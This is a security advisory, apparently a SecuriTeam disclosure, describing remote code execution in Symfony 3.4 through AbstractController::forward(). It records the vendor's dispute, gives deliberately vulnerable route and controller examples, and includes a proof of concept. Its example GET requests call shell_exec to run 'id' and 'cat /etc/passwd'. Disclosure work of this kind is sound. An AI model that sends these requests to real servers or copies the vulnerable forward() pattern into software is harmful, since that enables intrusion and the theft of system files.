**Vulnerability Summary**<br>
The following advisory describes a vulnerability found in Symfony 3.4 – a PHP framework that is used to create websites and web applications. Built on top of the Symfony Components. Under certain conditions, the Symfony framework can be abused to trigger RCE in the HttpKernel (http-kernel) component, while forward() is considered by the vendor as an equivalent to eval() (in its security implications) – there is no mentioning of this in the current documentation.

**Vendor Response**<br>
“As previously noted, unless there is something we are missing, the forward() method itself does not have a security vulnerability, but you believe having public methods that accept callables as arguments is in itself a security vulnerability. The forward() method allows you to pass a callable to it which, like many methods in many libraries including many common functions in PHP core such as array_filter (https://secure.php.net/manual/en/function.array-filter.php), if you pass untrusted user input into it, then it could result in remote code execution.
As with SQL queries, outputting data onto a page, using callables or using eval(), if you pass untrusted user input into them, it can result in security issues whether it be remote code execution, SQL injection or an XSS issue. As a framework, Symfony will attempt to aid users to write more secure code and provide tools for this, but a framework cannot assume complete and total responsibility as developers can always write insecure code and should always be aware of how they use unvalidated user input.
As I hope I’ve explained we do not believe this to be a security vulnerability, but if you believe we are still missing something, please do let us know.”
We disagree with this assessment, looking up examples of how to use forward(), there is no mentioning by anyone that you should filter user provided data as it may trigger a code execution vulnerability (unlike eval() equivalent or SQL statements equivalent examples), we therefore believe its prudent to publicly announce this issue.

**Credit**<br>
Independent security researcher, Calum Hutton, have reported this vulnerability to Beyond Security’s SecuriTeam Secure Disclosure program.

**Affected systems**<br>
Symfony Framework 3.4.* Running on Linux Systems.

**Vulnerability Details**<br>
The vulnerability occurs when the untrusted user data is passed into the forward() function provided by the frameworks AbstractController class. If this function is called in application code with untrusted user input, the application is potentially at risk of this issue.
Symfony allows for controllers to be any PHP callable (https://symfony.com/doc/current/controller.html#a-simple-controller) which gives great flexibity to the developer, but also potentially unforeseen consequences. Because of this, the string ‘system’ would be considered a valid controller, as it is a valid callable and would resolve to the builtin system() function. Symfony would successfully resolve and instantiate the controller instance and attempt to resolve the arguments required to call the new controller from the provided arguments and request context. This would normally fail (depending on the names, and number of arguments), causing the entire controller resolution to fail. One array that is searched for appropriate argument names during argument resolution is the path array passed into the AbstractController::forward() function.
Hence, by controlling the first (controller name/callable) and at least partially the second (path array) parameters of the AbstractController::forward() function, it is possible to call arbitrary PHP functions leading to RCE.
How to Exploit
One way developers might introduce parameters into the path array to pass on to the forwarded controller is through named URL route parameters. Consider the following route definition:
forward:
```shell
path: /forward/{controller}/{cmd}
defaults: { _controller: 'App\Controller\BaseController::myForward1' }
```

Both the controller and cmd route parameters will be passed into the BaseController::myForward1 controller:

```php
public function myForward1($controller, $cmd, array $path = array(), array $query = array()) {
 // Add the cmd var to the path array
 if ($cmd) {
  $path = compact('cmd');
 }
 return $this->forward($controller, $path, $query);
}
```

In this example route and controller, the cmd parameter is added to the path array (with the name cmd) that is passed into the AbstractController::forward() function. At this point, the controller is vulnerable to RCE with the below GET request: http://127.0.0.1/forward/shell_exec/id
By adding the cmd argument to the path array in the controller, and calling it cmd, Symfony will correctly resolve both the controller and arguments required for the shell_exec() PHP builtin function (http://php.net/manual/en/function.shell-exec.php). Once the controller and arguments are successfully resolved the controller is executed. Specifically in the above example URL, calling the Linux OS ‘id’ command. An alternative but still vulnerable route and controller combination is shown below, where URL query parameters from the request are merged into the path array and used in the AbstractController::forward() function.
forward:

```shell
path: /forward/{controller}/{cmd}
defaults: { _controller: 'App\Controller\BaseController::myForward2' }
```
```php
public function myForward2($controller, array $path = array(), array $query = array()) {
 // Get current request
 $req = App::getRequest();
 // Populate path vars from query params
 $path = array_merge($path, $req->query->all());
 return $this->forward($controller, $path, $query);
}
```
With a configuration such as this, the same command could be run with the GET request:
`http://127.0.0.1/forward2/shell_exec?cmd=id`

**PoC**<br>
With the following PHP page called ‘index.php’ located in the public symfony directory:

```php
<?php
use App\Core\App;
use Symfony\Component\Debug\Debug;
use Symfony\Component\Dotenv\Dotenv;
use Symfony\Component\HttpFoundation\Request;
require __DIR__.'/../vendor/autoload.php';
// The check is to ensure we don't use .env in production
if (!isset($_SERVER['APP_ENV'])) {
    if (!class_exists(Dotenv::class)) {
        throw new \RuntimeException('APP_ENV environment variable is not defined. You need to define environment variables for configuration or add "symfony/dotenv" as a Composer dependency to load variables from a .env file.');
    }
    (new Dotenv())->load(__DIR__.'/../.env');
}
if ($trustedProxies = $_SERVER['TRUSTED_PROXIES'] ?? false) {
    Request::setTrustedProxies(explode(',', $trustedProxies), Request::HEADER_X_FORWARDED_ALL ^ Request::HEADER_X_FORWARDED_HOST);
}
if ($trustedHosts = $_SERVER['TRUSTED_HOSTS'] ?? false) {
    Request::setTrustedHosts(explode(',', $trustedHosts));
}
$env = $_SERVER['APP_ENV'] ?? 'dev';
$debug = (bool) ($_SERVER['APP_DEBUG'] ?? ('prod' !== $env));
if ($debug) {
    umask(0000);
    Debug::enable();
}
$app = new App($env, $debug);
$request = App::getRequest();
$response = $app->handle($request);
$response->send();
$app->terminate($request, $response);
```

We can issue a GET Request for the next URL:<br>
`http://localhost:8000/forward2/shell_exec?cmd=cat%20/etc/passwd`
<img src="https://blogs.securiteam.com/wp-content/uploads/2018/10/Symfony-passwd-file.png"><br>
